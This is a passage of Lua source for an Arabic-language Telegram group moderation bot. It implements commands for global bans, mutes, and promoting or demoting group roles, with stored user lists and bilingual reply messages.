botdx(msg.chat_id_, msg.id_, 1, '👤╿❯ *المحظور* « ['..bot_res..'] »\n💯┊❯ *ايديه* « *'..ap[2]..'* »\n📌┊❯ *بواسطه « '..renk_bot(msg)..' »*\n☑️╽❯ *تم « الغاء حظره » من المجموعه*', 1, 'md')
end
end
end
end
-------------------------------------bot--------------------------------------------------------
local text = msg.content_.text_:gsub('حظر عام','Banall')
if text:match("^[Bb]anall$") and is_sudo(msg) and msg.reply_to_message_id_ then
function gban_by_reply(extra, result, success)
local gps = botx1:scard(BOT.."bot:groups")
local user_info_ = botx1:get(BOT..'user:Name' .. result.sender_user_id_)
local bot_res = user_info_
if user_info_ then
local hash = 'bot:gban:'
botx1:sadd(BOT..hash, result.sender_user_id_)
chat_kick(result.chat_id_, result.sender_user_id_)
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '*🎈|| The User ؛ '..result.sender_user_id_..' ، 🚷\n🎈|| has been globaly banned ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '👤╿❯ *العضو* « ['..bot_res..'] »\n💯┊❯ *ايديه* « *'..result.sender_user_id_..'* »\n📌┊❯ *بواسطه « '..renk_bot(msg)..' »*\n☑️╽❯ *تم حظره من « '..gps..' » مجموعه*', 1, 'md')
end
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,gban_by_reply)
end
----------------------------------------bot-------------------------------------------------------
if text:match("^[Bb]anall @(.*)$") and is_sudo(msg) then
local aps = {string.match(text, "^([Bb]anall) @(.*)$")}
function gban_by_username(extra, result, success)
local gps = botx1:scard(BOT.."bot:groups")
local user_info_ = botx1:get(BOT..'user:Name' .. result.id_)
local bot_res = user_info_
if user_info_ then
local hash = 'bot:gban:'
if result.id_ then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
text = '*🎈|| The User ؛ '..result.id_..' ، 🚷\n🎈|| has been globaly banned ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*'
else
text = '👤╿❯ العضو « '..bot_res..' »\n💯┊❯ ايديه « '..result.id_..' »\n📌┊❯ بواسطه « '..renk_bot(msg)..' »\n☑️╽❯ تم حظره من « '..gps..' » مجموعه'
end
botx1:sadd(BOT..hash, result.id_)
else
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
text = '*🎈|| Username is not correct ❎*'
else
text = '*🎈|| المعرف غير صحيح ❎*'
end
end
end
botdx(msg.chat_id_, msg.id_, 1, text, 1, 'html')
end
resolve_username(aps[2],gban_by_username)
end
----------------------------------bot-------------------------------------------------------------
if text:match("^[Bb]anall (%d+)$") and is_sudo(msg) then
local ap = {string.match(text, "^([Bb]anall) (%d+)$")}
local gps = botx1:scard(BOT.."bot:groups")
local user_info_ = botx1:get(BOT..'user:Name' .. ap[2])
local bot_res = user_info_
if user_info_ then
local hash = 'bot:gban:'
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '*🎈|| The User ؛ '..ap[2]..' ، 🚷\n🎈|| has been globaly banned ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '👤╿❯ *العضو* « ['..bot_res..'] »\n💯┊❯ *ايديه* « *'..ap[2]..'* »\n📌┊❯ *بواسطه « '..renk_bot(msg)..' »*\n☑️╽❯ *تم حظره من « '..gps..' » مجموعه*', 1, 'md')
end
end
botx1:set(BOT..'bot:gban:'..ap[2],true)
botx1:sadd(BOT..hash, ap[2])
end
---------------------------------------bot--------------------------------------------------------
local text = msg.content_.text_:gsub('الغاء العام','unbanall')
if text:match("^[Uu]nbanall$") and is_sudo(msg) and msg.reply_to_message_id_ then
function ungban_by_reply(extra, result, success)
local gps = botx1:scard(BOT.."bot:groups")
local user_info_ = botx1:get(BOT..'user:Name' .. result.sender_user_id_)
local bot_res = user_info_
if user_info_ then
local hash = 'bot:gban:'
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '*🎈|| The User ؛ '..result.sender_user_id_..' ، 🚷\n🎈|| has been unbanned (Gban) ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '👤╿❯ *العضو* « ['..bot_res..'] »\n💯┊❯ *ايديه* « *'..result.sender_user_id_..'* »\n📌┊❯ *بواسطه « '..renk_bot(msg)..' »*\n☑️╽❯ *تم الغاء حظره من « '..gps..' » مجموعه*', 1, 'md')
end
end
botx1:srem(BOT..hash, result.sender_user_id_)
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,ungban_by_reply)
end
------------------------------------------bot-----------------------------------------------------
if text:match("^[Uu]nbanall @(.*)$") and is_sudo(msg) then
local apid = {string.match(text, "^([Uu]nbanall) @(.*)$")}
function ungban_by_username(extra, result, success)
local gps = botx1:scard(BOT.."bot:groups")
local user_info_ = botx1:get(BOT..'user:Name' .. result.id_)
local bot_res = user_info_
if user_info_ then
local hash = 'bot:gban:'
if result.id_ then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
text = '*🎈|| The User ؛ '..result.id_..' ، 🚷\n🎈|| has been unbanned (Gban) ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*'
else
text = '👤╿❯ العضو « '..bot_res..' »\n💯┊❯ ايديه « '..result.id_..' »\n📌┊❯ بواسطه « '..renk_bot(msg)..' »\n☑️╽❯ تم الغاء حظره من « '..gps..' » مجموعه'
end
end
botx1:srem(BOT..hash, result.id_)
else
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
text = '*🎈|| Username is not correct ❎*'
else
text = '*🎈|| المعرف غير صحيح ❎*'
end
end
botdx(msg.chat_id_, msg.id_, 1, text, 1, 'html')
end
resolve_username(apid[2],ungban_by_username)
end
---------------------------------bot--------------------------------------------------------------
if text:match("^[Uu]nbanall (%d+)$") and is_sudo(msg) then
local ap = {string.match(text, "^([Uu]nbanall) (%d+)$")}
local gps = botx1:scard(BOT.."bot:groups")
local user_info_ = botx1:get(BOT..'user:Name' .. ap[2])
local bot_res = user_info_
if user_info_ then
local hash = 'bot:gban:'
botx1:srem(BOT..hash, ap[2])
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '*🎈|| The User ؛ '..ap[2]..' ، 🎈\n🚦|| has been unbanned (Gban) ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '👤╿❯ *العضو* « ['..bot_res..'] »\n💯┊❯ *ايديه* « *'..ap[2]..'* »\n📌┊❯ *بواسطه « '..renk_bot(msg)..' »*\n☑️╽❯ *تم الغاء حظره من « '..gps..' » مجموعه*', 1, 'md')
end
end
end
-----------------------------------------bot------------------------------------------------------
local text = msg.content_.text_:gsub('كتم','Muteuser')
if text:match("^[Mm]uteuser$") and msg.reply_to_message_id_ ~= 0 then
function mute_by_reply(extra, result, success)
local user_info_ = botx1:get(BOT..'user:Name' .. result.sender_user_id_)
local bot_res = user_info_
if user_info_ then
if tonumber(result.sender_user_id_) == tonumber(bot_id) then  
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ لا تستطيع كتمي •', 1, 'md')
return false 
end 
if is_momod(result.sender_user_id_, msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '👤╿❯ *لا تستطيع كتم* « ['..bot_res..'] »\n💯┊❯ *لانه تاج راسك •*', 1, 'md')
else 
botx1:sadd(BOT..'bot:muted:'..msg.chat_id_, result.sender_user_id_)
botdx(msg.chat_id_, msg.id_, 1, '👤╿❯ *العضو* « ['..bot_res..'] »\n💯┊❯ *ايديه* « *'..result.sender_user_id_..'* »\n📌┊❯ *بواسطه « '..renk_bot(msg)..' »*\n☑️╽❯ *تم  «كتمه » بنجاح*', 1, 'md')
end
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,mute_by_reply)
end
----------------------------------------faedrr-------------------------------------------------------
if text:match("^[Mm]uteuser @(.*)$") then
local ap = {string.match(text, "^([Mm]uteuser) @(.*)$")}
function mute_by_username(extra, result, success)
local user_info_ = botx1:get(BOT..'user:Name' .. result.id_)
local bot_res = user_info_
if user_info_ then
if result.id_ then
botx1:sadd(BOT..'bot:muted:'..msg.chat_id_, result.id_)
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
texts = '*🎈|| The User ؛ '..result.id_..' ، 🚷\n🚦|| has been muted ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*'
else
texts = '👤╿❯ العضو « '..bot_res..' »\n💯┊❯ ايديه « '..result.id_..' »\n📌┊❯ بواسطه « '..renk_bot(msg)..' »\n☑️╽❯ تم « كتمه » بنجاح'
end
chat_kick(msg.chat_id_, result.id_)
else
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
texts = '*🎈|| Username is not correct ❎*'
else
texts = '*🎈|| المعرف غير صحيح ❎*'
end
end
end
botdx(msg.chat_id_, msg.id_, 1, texts, 1, 'html')
end
resolve_username(ap[2],mute_by_username)
end
---------------------------------bot--------------------------------------------------------------
if text:match("^[Mm]uteuser (%d+)$") then
local ap = {string.match(text, "^([Mm]uteuser) (%d+)$")}
local user_info_ = botx1:get(BOT..'user:Name' .. ap[2])
local bot_res = user_info_
if user_info_ then
if botx1:sismember(BOT..'bot:muted:'..msg.chat_id_, ap[2]) then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '*🎈|| The User ؛ '..ap[2]..' ، 🚷\n🎈|| is already muted ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '👤╿❯ *العضو* « ['..bot_res..'] »\n💯┊❯ *ايديه* « *'..ap[2]..'* »\n📌┊❯ *بواسطه « '..renk_bot(msg)..' »*\n☑️╽❯ *تم  «كتمه » سابقا*', 1, 'md')
end
end
botx1:sadd(BOT..'bot:muted:'..msg.chat_id_, ap[2])
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '*🎈|| The User ؛ '..ap[2]..' ، 🚷\n🎈|| has been muted ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '👤╿❯ *العضو* « ['..bot_res..'] »\n💯┊❯ *ايديه* « *'..ap[2]..'* »\n📌┊❯ *بواسطه « '..renk_bot(msg)..' »*\n☑️╽❯ *تم  «كتمه » بنجاح*', 1, 'md')
end
end
end
end
------------------------------------bot-----------------------------------------------------------
local text = msg.content_.text_:gsub('الغاء كتم','Unmuteuser')
if text:match("^[Uu]nmuteuser$") and msg.reply_to_message_id_ ~= 0 then
function unmute_by_reply(extra, result, success)
local user_info_ = botx1:get(BOT..'user:Name' .. result.sender_user_id_)
local bot_res = user_info_
if user_info_ then
local hash = 'bot:muted:'..msg.chat_id_
if not botx1:sismember(BOT..hash, result.sender_user_id_) then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '*🎈|| The User ؛ '..result.sender_user_id_..' ، 🚷\n🎈|| not muted ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '👤╿❯ *العضو* « ['..bot_res..'] »\n💯┊❯ *ايديه* « *'..result.sender_user_id_..'* »\n📌┊❯ *بواسطه « '..renk_bot(msg)..' »*\n☑️╽❯ *لم يتم « كتمه » سابقا*', 1, 'md')
end
else
botx1:srem(BOT..hash, result.sender_user_id_)
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '*🎈|| The User ؛ '..result.sender_user_id_..' ، 🚷\n🎈|| has been unmuted ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '👤╿❯ *المكتوم* « ['..bot_res..'] »\n💯┊❯ *ايديه* « *'..result.sender_user_id_..'* »\n📌┊❯ *بواسطه « '..renk_bot(msg)..' »*\n☑️╽❯ *تم  « الغاء كتمه » بنجاح*', 1, 'md')
end
end
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,unmute_by_reply)
end
------------------------------------bot-----------------------------------------------------------
if text:match("^[Uu]nmuteuser @(.*)$") then
local ap = {string.match(text, "^([Uu]nmuteuser) @(.*)$")}
function unmute_by_username(extra, result, success)
local user_info_ = botx1:get(BOT..'user:Name' .. result.id_)
local bot_res = user_info_
if user_info_ then
if result.id_ then
if not botx1:sismember(BOT..'bot:muted:'..msg.chat_id_, result.id_) then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '*🎈|| The User ؛ '..result.id_..' ، 🚷\n🎈|| not muted ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '??╿❯ *العضو* « ['..bot_res..'] »\n💯┊❯ *ايديه* « *'..result.id_..'* »\n📌┊❯ *بواسطه « '..renk_bot(msg)..' »*\n☑️╽❯ *لم يتم « كتمه » سابقا*', 1, 'md')
end
else
botx1:srem(BOT..'bot:muted:'..msg.chat_id_, result.id_)
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
text = '*🎈|| The User ؛ '..result.id_..' ، 🚷\n🎈|| has been unmuted ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*'
else
text = '👤╿❯ المكتوم « '..bot_res..' »\n💯┊❯ ايديه « '..result.id_..' »\n📌┊❯ بواسطه « '..renk_bot(msg)..' »\n☑️╽❯ تم « الغاء كتمه » بنجاح'
end
end
end
else
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
text = '*🎈|| Username is not correct ❎*'
else
text = '*🎈|| المعرف غير صحيح ❎*'
end
end
botdx(msg.chat_id_, msg.id_, 1, text, 1, 'html')
end
resolve_username(ap[2],unmute_by_username)
end
---------------------------------bot--------------------------------------------------------------
if text:match("^[Uu]nmuteuser (%d+)$") then
local ap = {string.match(text, "^([Uu]nmuteuser) (%d+)$")}
local user_info_ = botx1:get(BOT..'user:Name' .. ap[2])
local bot_res = user_info_
if user_info_ then
if not botx1:sismember(BOT..'bot:muted:'..msg.chat_id_, ap[2]) then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '*🎈|| The User ؛ '..ap[2]..' ، 🚷\n🎈|| not muted ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '👤╿❯ *العضو* « ['..bot_res..'] »\n💯┊❯ *ايديه* « *'..ap[2]..'* »\n📌┊❯ *بواسطه « '..renk_bot(msg)..' »*\n☑️╽❯ *لم يتم « كتمه » سابقا*', 1, 'md')
end
else
botx1:srem(BOT..'bot:muted:'..msg.chat_id_, ap[2])
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '*🎈|| The User ؛ '..ap[2]..' ، 🚷\n🎈|| has been unmuted ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '👤╿❯ *المكتوم* « ['..bot_res..'] »\n💯┊❯ *ايديه* « *'..ap[2]..'* »\n📌┊❯ *بواسطه « '..renk_bot(msg)..' »*\n☑️╽❯ *تم  « الغاء كتمه » بنجاح*', 1, 'md')
end
end
end
end
end 
------------
if is_admin(msg.sender_user_id_, msg.chat_id_) and msg.reply_to_message_id_ ~= 0 then
if text:match("^رفع منشئ$") then 
function setmonsh_by_reply(extra, result, success)
local user_info_ = botx1:get(BOT..'user:Name' .. result.sender_user_id_)
local bot_res = user_info_
if user_info_ then
local hash = 'bot:monsh:'..msg.chat_id_
if botx1:sismember(BOT..hash, result.sender_user_id_) then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '*🎈|| The User ؛ '..result.sender_user_id_..' ، 🚷\n🎈|| is now monsh ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '👤╿❯ *العضو* « ['..bot_res..'] »\n💯┊❯ *ايديه* « *'..result.sender_user_id_..'* »\n📌┊❯ *بواسطه « '..renk_bot(msg)..' »*\n☑️╽❯ *تم رفعه « منشئ » سابقا*', 1, 'md')
end
else
botx1:sadd(BOT..hash, result.sender_user_id_)
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '*🎈|| The User ؛ '..result.sender_user_id_..' ، 🚷\n🎈|| has been monsh ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '👤╿❯ *العضو* « ['..bot_res..'] »\n💯┊❯ *ايديه* « *'..result.sender_user_id_..'* »\n📌┊❯ *بواسطه « '..renk_bot(msg)..' »*\n☑️╽❯ *تم رفعه « منشئ » بنجاح*', 1, 'md')
end
end
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,setmonsh_by_reply)
end
end
--------------------------------------------faedee---------------------------------------------------
 if is_admin(msg.sender_user_id_, msg.chat_id_) and msg.reply_to_message_id_ ~= 0 then
if text:match("^رفع منشئ$") then
function setmonsh_by_reply(extra, result, success)
local user_info_ = botx1:get(BOT..'user:Name' .. result.sender_user_id_)
local bot_res = user_info_
if user_info_ then
local hash = 'bot:monsh:'..msg.chat_id_
if botx1:sismember(BOT..hash, result.sender_user_id_) then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '*🎈|| The User ؛ '..result.sender_user_id_..' ، 🚷\n🎈|| is now monsh ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '👤╿❯ *العضو* « ['..bot_res..'] »\n💯┊❯ *ايديه* « *'..result.sender_user_id_..'* »\n📌┊❯ *بواسطه « '..renk_bot(msg)..' »*\n☑️╽❯ *تم رفعه « منشئ » سابقا*', 1, 'md')
end
else
botx1:sadd(BOT..hash, result.sender_user_id_)
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '*🎈|| The User ؛ '..result.sender_user_id_..' ، 🚷\n🎈|| has been monsh ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '👤╿❯ *العضو* « ['..bot_res..'] »\n💯┊❯ *ايديه* « *'..result.sender_user_id_..'* »\n📌┊❯ *بواسطه « '..renk_bot(msg)..' »*\n☑️╽❯ *تم رفعه « منشئ » بنجاح*', 1, 'md')
end
end
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,setmonsh_by_reply)
end
end
--------------------------------------------faedee---------------------------------------------------
if is_admin(msg.sender_user_id_, msg.chat_id_) then
if text:match("^رفع منشئ @(.*)$") then
local ap = {string.match(text, "^(رفع منشئ) @(.*)$")}
function setmonsh_by_username(extra, result, success)
local user_info_ = botx1:get(BOT..'user:Name' .. result.id_)
local bot_res = user_info_
if user_info_ then
if result.id_ then
botx1:sadd(BOT..'bot:monsh:'..msg.chat_id_, result.id_)
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
texts = '*🎈|| The User ؛ '..result.id_..' ، 🚷\n🎈|| added to monsh list ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*'
else
texts = '👤╿❯ العضو « '..bot_res..' »\n💯┊❯ ايديه « '..result.id_..' »\n📌┊❯ بواسطه « '..renk_bot(msg)..' »\n☑️╽❯ تم رفعه « منشئ » بنجاح'
end
else
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
texts = '*🎈|| Username is not correct ❎*'
else
texts = '*🎈|| المعرف غير صحيح ❎*'
end 
end
end
botdx(msg.chat_id_, msg.id_, 1, texts, 1, 'html')
end
resolve_username(ap[2],setmonsh_by_username)
end
end
--------------------------------------bot---------------------------------------------------------
if is_admin(msg.sender_user_id_, msg.chat_id_) then
if text:match("^رفع منشئ (%d+)$") then
local ap = {string.match(text, "^(رفع منشئ) (%d+)$")}
local user_info_ = botx1:get(BOT..'user:Name' .. ap[2])
local bot_res = user_info_
if user_info_ then
botx1:sadd(BOT..'bot:monsh:'..msg.chat_id_, ap[2])
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '*🎈|| The User ؛ '..ap[2]..' ، 🚷\n🎈|| has been monsh ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '👤╿❯ *العضو* « ['..bot_res..'] »\n💯┊❯ *ايديه* « *'..ap[2]..'* »\n📌┊❯ *بواسطه « '..renk_bot(msg)..' »*\n☑️╽❯ *تم رفعه « منشئ » بنجاح*', 1, 'md')
end
end
end
end 
----------------------------------------bot-------------------------------------------------------
if is_admin(msg.sender_user_id_) and msg.reply_to_message_id_ ~= 0 then
if text:match("^تنزيل منشئ$") then
function demonsh_by_reply(extra, result, success)
local user_info_ = botx1:get(BOT..'user:Name' .. result.sender_user_id_)
local bot_res = user_info_
if user_info_ then
local hash = 'bot:monsh:'..msg.chat_id_
if not botx1:sismember(BOT..hash, result.sender_user_id_) then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '*🎈|| The User ؛ '..result.sender_user_id_..' ، 🚷\n🎈|| is not a monsh ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '👤╿❯ *العضو* « ['..bot_res..'] »\n💯┊❯ *ايديه* « *'..result.sender_user_id_..'* »\n📌┊❯ *بواسطه « '..renk_bot(msg)..' »*\n☑️╽❯ *لم يتم رفعه « منشئ » سابقا*', 1, 'md')
end
else
botx1:srem(BOT..hash, result.sender_user_id_)
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '*🎈|| The monsh ؛ '..result.sender_user_id_..' ، 🚷\n🎈|| removed from monsh list ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '👤╿❯ *العضو* « ['..bot_res..'] »\n💯┊❯ *ايديه* « *'..result.sender_user_id_..'* »\n📌┊❯ *بواسطه « '..renk_bot(msg)..' »*\n☑️╽❯ * تم تنزيله من « قائمه المنشئين »*', 1, 'md')
end
end
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,demonsh_by_reply)
end 
end
----------------------------------------bot-------------------------------------------------------
if is_admin(msg.sender_user_id_, msg.chat_id_) then
if text:match("^تنزيل المنشئ @(.*)$") then
local hash = 'bot:monsh:'..msg.chat_id_
local ap = {string.match(text, "^(تنزيل منشئ) @(.*)$")}
function remmonsh_by_username(extra, result, success)
local user_info_ = botx1:get(BOT..'user:Name' .. result.id_)
local bot_res = user_info_
if user_info_ then 
if result.id_ then
botx1:srem(BOT..hash, result.id_)
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
texts = '*🎈|| The Owner ؛ '..result.id_..' ، 🚷\n🎈|| removed from monsh list ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*'
else
texts = '👤╿❯ العضو « '..bot_res..' »\n💯┊❯ ايديه « '..result.id_..' »\n📌┊❯ بواسطه « '..renk_bot(msg)..' »\n☑️╽❯ تم تنزيله من « قائمه المنشئين »'
end
else
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
texts = '*🎈|| Username is not correct ❎*'
else
texts = '*🎈|| المعرف غير صحيح ❎*'
end
end
end
botdx(msg.chat_id_, msg.id_, 1, texts, 1, 'html')
end
resolve_username(ap[2],remmonsh_by_username)
end
end
----------------------------------------------bot-------------------------------------------------
if is_admin(msg.sender_user_id_, msg.chat_id_) then
if text:match("^تنزيل منشئ (%d+)$") then
local hash = 'bot:monsh:'..msg.chat_id_
local ap = {string.match(text, "^(تنزيل منشئ) (%d+)$")}
local user_info_ = botx1:get(BOT..'user:Name' .. ap[2])
local bot_res = user_info_
if user_info_ then
botx1:srem(BOT..hash, ap[2])
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '*🎈|| The monsh ؛ '..ap[2]..' ، 🚷\n🎈|| removed from monsh list ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '👤╿❯ *العضو* « ['..bot_res..'] »\n💯┊❯ *ايديه* « *'..ap[2]..'* »\n📌┊❯ *بواسطه « '..renk_bot(msg)..' »*\n☑️╽❯ *تم تنزيله من « قائمه المنشئين »*', 1, 'md')
end
end
end
end
-------------------------------bot-------------------
if is_admin(msg.sender_user_id_) and msg.reply_to_message_id_ ~= 0 then
if text:match("^رفع مدير عام$") then
function setownerall_by_reply(extra, result, success)
local user_info_ = botx1:get(BOT..'user:Name' .. result.sender_user_id_)
local bot_res = user_info_
if user_info_ then
local hash = 'bot:onall:'
if botx1:sismember(BOT..hash, result.sender_user_id_) then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '*🎈|| The User ؛ '..result.sender_user_id_..' ، 🚷\n📌|| is now onwer all✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '👤╿❯ *العضو* « ['..bot_res..'] »\n💯┊❯ *ايديه* « *'..result.sender_user_id_..'* »\n📌┊❯ *بواسطه « '..renk_bot(msg)..' »*\n☑️╽❯ *تم رفعه « مدير عام » سابقا*', 1, 'md')
end
else
botx1:sadd(BOT..hash, result.sender_user_id_)
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '*🎈|| The User ؛ '..result.sender_user_id_..' ، 🚷\n🎈|| has been onwer all ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '👤╿❯ *العضو* « ['..bot_res..'] »\n💯┊❯ *ايديه* « *'..result.sender_user_id_..'* »\n📌┊❯ *بواسطه « '..renk_bot(msg)..' »*\n☑️╽❯ *تم رفعه « مدير عام » بنجاح*', 1, 'md')
end
end
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,setownerall_by_reply)
end
end
--------------------------------------------faedee---------------------------------------------------
if is_admin(msg.sender_user_id_, msg.chat_id_) then
if text:match("^رفع مدير عام @(.*)$") then
local ap = {string.match(text, "^(رفع مدير عام) @(.*)$")}
function setownerall_by_username(extra, result, success)
local user_info_ = botx1:get(BOT..'user:Name' .. result.id_)
local bot_res = user_info_
if user_info_ then
if result.id_ then
botx1:sadd(BOT..'bot:onall:', result.id_)
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
texts = '*🎈|| The User ؛ '..result.id_..' ، 🚷\n🎈|| added to owner all list ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*'
else
texts = '👤╿❯ العضو « '..bot_res..' »\n💯┊❯ ايديه « '..result.id_..' »\n📌┊❯ بواسطه « '..renk_bot(msg)..' »\n☑️╽❯ تم رفعه « مدير عام » بنجاح'
end
else
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
texts = '*🎈|| Username is not correct ❎*'
else
texts = '*🎈|| المعرف غير صحيح ❎*'
end
end
end
botdx(msg.chat_id_, msg.id_, 1, texts, 1, 'html')
end
resolve_username(ap[2],setownerall_by_username)
end
end
--------------------------------------bot---------------------------------------------------------
if is_admin(msg.sender_user_id_, msg.chat_id_) then
if text:match("^رفع مدير عام (%d+)$") then
local ap = {string.match(text, "^(رفع مدير عام) (%d+)$")}
local user_info_ = botx1:get(BOT..'user:Name' .. ap[2])
local bot_res = user_info_
if user_info_ then
botx1:sadd(BOT..'bot:onall:', ap[2])
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '*🎈|| The User ؛ '..ap[2]..' ، 🚷\n🎈|| has been onwer all ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '👤╿❯ *العضو* « ['..bot_res..'] »\n💯┊❯ *ايديه* « *'..ap[2]..'* »\n📌┊❯ *بواسطه « '..renk_bot(msg)..' »*\n☑️╽❯ *تم رفعه « مدير عام » بنجاح*', 1, 'md')
end
end
end
end
----------------------------------------bot-------------------------------------------------------
if is_admin(msg.sender_user_id_) and msg.reply_to_message_id_ ~= 0 then
if text:match("^تنزيل مدير عام$") then
function deownerall_by_reply(extra, result, success)
local user_info_ = botx1:get(BOT..'user:Name' .. result.sender_user_id_)
local bot_res = user_info_
if user_info_ then
local hash = 'bot:onall:'
if not botx1:sismember(BOT..hash, result.sender_user_id_) then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '*🎈|| The User ؛ '..result.sender_user_id_..' ، 🚷\n🎈|| is not a owner all ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '👤╿❯ *العضو* « ['..bot_res..'] »\n💯┊❯ *ايديه* « *'..result.sender_user_id_..'* »\n📌┊❯ *بواسطه « '..renk_bot(msg)..' »*\n☑️╽❯ *لم يتم رفعه « مدير عام » سابقا*', 1, 'md')
end
else
botx1:srem(BOT..hash, result.sender_user_id_)
